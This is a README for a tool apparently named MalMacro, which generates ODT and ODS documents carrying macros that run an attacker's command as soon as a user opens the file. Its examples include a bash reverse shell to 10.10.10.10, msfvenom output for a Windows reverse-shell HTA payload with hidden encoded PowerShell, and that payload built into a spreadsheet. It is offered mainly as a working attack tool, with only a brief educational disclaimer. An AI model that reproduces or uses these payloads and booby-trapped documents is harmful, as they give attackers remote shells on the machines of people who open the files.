## Malicious VBA Macro Generator
One general way to gain a foothold on a user's machine in a red-teaming engagement is the use of delivering a document that has a macro enabled that executes a command, which is triggered upon the user opening the document. This program generates one such document in ODT format (I may add Word, and Excel documents later).

### Update 2
MalMacro now supports ODS files.

### Update 1
MalMacro now supports commands of arbitrary length. This has particular application to obfuscated powershell commands, which can be extremely lengthy.

Examples:

```bash
$ python malmacro.py
Usage: malmacro.py <odt|ods> <code_to_execute>

$ malmacro.py odt "bash -i >& /dev/tcp/10.10.10.10/9001 0>&1"

# malmacro.odt generated
$ ls
LICENSE  macro.ods  macro.odt  malmacro.odt  malmacro.py  README.md

# Generate hta payload with msfvenom:
$  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7378 bytes
<script language="VBScript">
  window.moveTo -4000, -4000
  Set blx9LNamq = CreateObject("Wscript.Shell")
  Set dhC = CreateObject("Scripting.FileSystemObject")
  For each path in Split(blx9LNamq.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If dhC.FileExists(path + "\..\powershell.exe") Then
      blx9LNamq.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAO<SNIP>AHIAdAAoACQAcwApADsA",0
      Exit For
    End If
  Next
  window.close()
</script>

# Take powershell code to make malicious macro document
$ ./malmacro.py ods 'powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAG<SNIP>'

```

## Disclaimer
This project is made for demonstrative and educational purposes only. I'm not liable for how you use it.
